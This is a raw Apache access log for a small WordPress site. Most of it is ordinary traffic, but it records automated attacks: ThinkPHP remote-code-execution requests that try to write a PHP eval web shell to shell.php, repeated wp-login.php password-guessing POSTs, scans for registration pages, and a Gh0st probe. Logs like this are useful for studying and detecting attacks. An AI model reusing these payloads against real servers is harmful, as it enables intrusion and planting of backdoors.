122.112.206.233 - - [16/Feb/2020:19:18:11 -0700] "GET //login.action HTTP/1.1" 301 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:12 -0700] "GET /login.action HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:14 -0700] "GET //showcase.action HTTP/1.1" 301 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:15 -0700] "GET /showcase.action HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:17 -0700] "GET //upload.action HTTP/1.1" 301 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:20 -0700] "GET /upload.action HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:22 -0700] "GET //showAnouncement.action HTTP/1.1" 301 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:23 -0700] "GET /showAnouncement.action HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:24 -0700] "GET //public/index.php HTTP/1.1" 301 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:25 -0700] "GET /public/ HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:25 -0700] "GET //index.php HTTP/1.1" 200 19166 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
127.0.0.1 - - [16/Feb/2020:19:18:39 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
122.112.206.233 - - [16/Feb/2020:19:18:39 -0700] "POST //index.php/?s=captcha HTTP/1.1" 200 17923 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:40 -0700] "POST //index.php/?s=captcha HTTP/1.1" 200 17923 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:41 -0700] "GET //index.php/?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=shell.php&content=%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22 HTTP/1.1" 200 18027 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:41 -0700] "GET //index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=shell.php&vars%5B1%5D%5B%5D=%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22 HTTP/1.1" 200 18002 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:42 -0700] "GET //index.php/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php HTTP/1.1" 200 18002 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:43 -0700] "GET //index.php/?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php HTTP/1.1" 200 17984 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:44 -0700] "GET //index.php/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php HTTP/1.1" 200 17984 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:18:45 -0700] "GET //index.php/?s=index/%5Cthink%5Cview%5Cdriver%5CPhp/display&content=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php HTTP/1.1" 200 18018 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:19:11 -0700] "GET //index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php HTTP/1.1" 200 18017 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:19:12 -0700] "GET //index.php/?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20%22%3C?php%20@eval($_POST%5Bshell%5D);?%3E%22%20%3E%3Eshell.php HTTP/1.1" 200 18017 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:19:14 -0700] "GET ///shell.php HTTP/1.1" 301 - "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
122.112.206.233 - - [16/Feb/2020:19:19:16 -0700] "GET /shell.php HTTP/1.1" 404 17803 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)"
127.0.0.1 - - [16/Feb/2020:19:30:40 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:19:30:43 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:19:31:22 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:19:36:21 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:19:38:14 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
196.2.14.184 - - [16/Feb/2020:19:42:49 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
82.117.194.229 - - [16/Feb/2020:20:07:49 -0700] "GET /wp2/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
82.117.194.229 - - [16/Feb/2020:20:08:25 -0700] "GET /wp2/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
127.0.0.1 - - [16/Feb/2020:20:12:50 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
191.242.169.171 - - [16/Feb/2020:20:18:41 -0700] "GET /index.php?s=/index/ hink" 400 332 "-" "-"
104.238.117.191 - - [16/Feb/2020:20:32:07 -0700] "POST /wp-cron.php?doing_wp_cron=1581910327.8011410236358642578125 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581910327.8011410236358642578125" "WordPress/5.3.2; http://datostech.com"
14.177.154.149 - - [16/Feb/2020:20:32:07 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:09 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:10 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:11 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:12 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:14 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:15 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:16 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:17 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:18 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:19 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:19 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:21 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:22 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:23 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:23 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:24 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:25 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:26 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
14.177.154.149 - - [16/Feb/2020:20:32:27 -0700] "POST /wp-login.php HTTP/1.1" 200 8016 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
127.0.0.1 - - [16/Feb/2020:20:32:53 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:20:38:25 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
192.241.238.60 - - [16/Feb/2020:20:48:05 -0700] "GET / HTTP/1.1" 301 - "-" "Mozilla/5.0 zgrab/0.x"
5.135.143.224 - - [16/Feb/2020:20:59:31 -0700] "GET /www/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
5.135.143.224 - - [16/Feb/2020:21:00:53 -0700] "GET /www/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
127.0.0.1 - - [16/Feb/2020:21:04:16 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
217.174.253.177 - - [16/Feb/2020:21:04:50 -0700] "GET / HTTP/1.1" 200 26732 "-" "Go-http-client/1.1"
217.174.253.177 - - [16/Feb/2020:21:04:51 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.59 Safari/537.36"
183.160.215.107 - - [16/Feb/2020:21:09:42 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
183.160.215.107 - - [16/Feb/2020:21:09:43 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
183.160.215.107 - - [16/Feb/2020:21:10:05 -0700] "GET / HTTP/1.0" 200 26732 "http://datostech.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
183.160.215.107 - - [16/Feb/2020:21:10:10 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
104.238.117.191 - - [16/Feb/2020:21:19:08 -0700] "POST /wp-cron.php?doing_wp_cron=1581913148.7863318920135498046875 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581913148.7863318920135498046875" "WordPress/5.3.2; http://datostech.com"
103.116.12.238 - - [16/Feb/2020:21:19:08 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:31 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:32 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:33 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:37 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:38 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:41 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:42 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:43 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:44 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:44 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:48 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:51 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:53 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:54 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:19:57 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:20:02 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:20:03 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
103.116.12.238 - - [16/Feb/2020:21:20:06 -0700] "POST /wp-login.php HTTP/1.1" 200 8016 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
66.240.205.34 - - [16/Feb/2020:21:44:43 -0700] "Gh0st\xad" 400 332 "-" "-"
127.0.0.1 - - [16/Feb/2020:21:52:54 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:21:53:26 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [16/Feb/2020:21:53:27 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
178.17.177.62 - - [16/Feb/2020:22:03:04 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
178.17.177.62 - - [16/Feb/2020:22:03:05 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
178.17.177.62 - - [16/Feb/2020:22:03:08 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
104.238.117.191 - - [16/Feb/2020:22:11:05 -0700] "POST /wp-cron.php?doing_wp_cron=1581916265.8522479534149169921875 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581916265.8522479534149169921875" "WordPress/5.3.2; http://datostech.com"
193.106.30.99 - - [16/Feb/2020:22:11:05 -0700] "POST /layouts/joomla/toolbar/help.php HTTP/1.1" 404 17752 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
127.0.0.1 - - [16/Feb/2020:22:12:57 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
46.166.187.111 - - [16/Feb/2020:22:31:31 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"
5.188.210.18 - - [16/Feb/2020:22:48:39 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.51"
104.238.117.191 - - [16/Feb/2020:22:48:40 -0700] "POST /wp-cron.php?doing_wp_cron=1581918520.3602259159088134765625 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581918520.3602259159088134765625" "WordPress/5.3.2; http://datostech.com"
5.188.210.18 - - [16/Feb/2020:22:48:39 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.51"
5.188.210.18 - - [16/Feb/2020:22:48:41 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36 OPR/54.0.2952.51"
185.75.109.212 - - [16/Feb/2020:22:51:54 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
123.21.108.250 - - [16/Feb/2020:22:59:20 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:21 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:22 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:23 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:24 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:24 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:25 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:26 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:27 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:27 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:28 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:29 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:30 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:31 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:31 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:32 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:33 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:34 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:34 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
123.21.108.250 - - [16/Feb/2020:22:59:35 -0700] "POST /wp-login.php HTTP/1.1" 200 8007 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
159.65.162.186 - - [16/Feb/2020:22:59:46 -0700] "GET /blog/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
159.65.162.186 - - [16/Feb/2020:23:02:36 -0700] "GET /blog/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
127.0.0.1 - - [16/Feb/2020:23:03:28 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
193.198.66.62 - - [16/Feb/2020:23:06:49 -0700] "GET /index.php?s=/index/ hink" 400 332 "-" "-"
104.238.117.191 - - [16/Feb/2020:23:16:34 -0700] "POST /wp-cron.php?doing_wp_cron=1581920194.3434870243072509765625 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581920194.3434870243072509765625" "WordPress/5.3.2; http://datostech.com"
132.148.80.15 - - [16/Feb/2020:23:16:33 -0700] "GET /backup/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
51.254.199.12 - - [16/Feb/2020:23:17:01 -0700] "GET /oldsite/register/ HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
